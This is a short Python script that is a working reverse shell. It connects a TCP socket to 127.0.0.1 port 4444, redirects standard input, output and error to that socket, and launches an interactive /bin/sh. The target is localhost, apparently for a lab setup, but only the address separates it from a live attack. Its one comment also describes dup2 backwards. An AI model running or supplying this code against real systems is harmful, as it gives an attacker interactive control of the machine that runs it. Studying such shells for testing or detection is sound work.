import socket
import subprocess
import os

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect(("127.0.0.1",4444))

# Redirect FD: dup2(a,b) -> dup b to a.
os.dup2(sock.fileno(),0)
os.dup2(sock.fileno(),1)
os.dup2(sock.fileno(),2)

subprocess.call(["/bin/sh","-i"])